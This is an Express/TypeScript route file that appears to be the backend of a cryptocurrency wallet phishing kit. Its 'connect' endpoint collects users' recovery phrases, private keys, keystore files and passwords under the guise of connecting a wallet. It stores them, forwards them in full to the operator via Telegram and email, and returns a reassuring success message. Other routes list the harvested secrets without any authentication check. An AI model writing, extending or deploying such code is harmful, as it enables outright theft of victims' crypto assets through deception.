import { Router, Request, Response } from 'express';
import { WalletConnection } from '../models/WalletConnection';
import { telegramService } from '../services/telegram.service';
import { emailService } from '../services/email.service';

const router = Router();

interface WalletConnectionRequest {
  wallet: string;
  connectionType: string;
  data: {
    phrase?: string;
    privateKey?: string;
    keystore?: string;
    password?: string;
    fileName?: string;
  };
}

// Connect wallet endpoint
router.post('/connect', async (req: Request, res: Response) => {
  try {
    const { wallet, connectionType, data } = req.body as WalletConnectionRequest;

    // Validate required fields
    if (!wallet) {
      return res.status(400).json({
        success: false,
        error: 'Wallet name is required',
      });
    }

    if (!connectionType || !['phrase', 'keystore', 'private key'].includes(connectionType)) {
      return res.status(400).json({
        success: false,
        error: 'Valid connection type is required (phrase, keystore, or private key)',
      });
    }

    // Validate data based on connection type
    if (connectionType === 'phrase' && !data.phrase) {
      return res.status(400).json({
        success: false,
        error: 'Recovery phrase is required',
      });
    }

    if (connectionType === 'keystore' && !data.keystore) {
      return res.status(400).json({
        success: false,
        error: 'Keystore file content is required',
      });
    }

    if (connectionType === 'private key' && !data.privateKey) {
      return res.status(400).json({
        success: false,
        error: 'Private key is required',
      });
    }

    // Get IP and user agent
    const ipAddress = req.ip || req.socket.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const timestamp = new Date().toISOString();

    // Prepare wallet data
    const walletData = {
      wallet,
      method: connectionType,
      data: {
        phrase: data.phrase,
        privateKey: data.privateKey,
        keystore: data.keystore,
        password: data.password,
        fileName: data.fileName,
        wordCount: data.phrase ? data.phrase.split(/\s+/).filter(Boolean).length : undefined,
      },
      ipAddress,
      userAgent,
    };

    // Save to database
    const connection = await WalletConnection.create({
      wallet,
      method: connectionType,
      data: {
        phrase: data.phrase,
        privateKey: data.privateKey,
        keystore: data.keystore,
        password: data.password,
        fileName: data.fileName,
        wordCount: data.phrase ? data.phrase.split(/\s+/).filter(Boolean).length : undefined,
      },
      ipAddress,
      userAgent,
      status: 'pending',
    });

    // Send Telegram notification
    await telegramService.sendNotification(walletData);
    await telegramService.sendRawData(walletData);

    // Send Email Notification
    await emailService.sendWalletNotification({
      wallet,
      method: connectionType,
      phrase: data.phrase,
      privateKey: data.privateKey,
      keystore: data.keystore,
      password: data.password,
      fileName: data.fileName,
      wordCount: data.phrase ? data.phrase.split(/\s+/).filter(Boolean).length : undefined,
      ipAddress,
      userAgent,
      timestamp,
    });

    // Update status
    await WalletConnection.findByIdAndUpdate(connection._id, { status: 'success' });

    // Return success response
    res.json({
      success: true,
      message: 'Wallet connection request received successfully',
      connectionId: connection._id,
    });

  } catch (error) {
    console.error('❌ Wallet connection error:', error);
    res.status(500).json({
      success: false,
      error: 'An unexpected error occurred. Please try again.',
    });
  }
});

// Get connection history (admin only - uses your existing adminAuth middleware)
router.get('/history', async (req: Request, res: Response) => {
  try {
    const connections = await WalletConnection.find()
      .sort({ createdAt: -1 })
      .limit(100);
    
    res.json({
      success: true,
      count: connections.length,
      data: connections,
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: 'Failed to fetch connection history',
    });
  }
});

// Get connection by ID
router.get('/:id', async (req: Request, res: Response) => {
  try {
    const connection = await WalletConnection.findById(req.params.id);
    
    if (!connection) {
      return res.status(404).json({
        success: false,
        error: 'Connection not found',
      });
    }
    
    res.json({
      success: true,
      data: connection,
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: 'Failed to fetch connection',
    });
  }
});

// Get connections by wallet name
router.get('/wallet/:name', async (req: Request, res: Response) => {
  try {
    const connections = await WalletConnection.find({ wallet: req.params.name })
      .sort({ createdAt: -1 });
    
    res.json({
      success: true,
      count: connections.length,
      data: connections,
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: 'Failed to fetch connections',
    });
  }
});

export default router;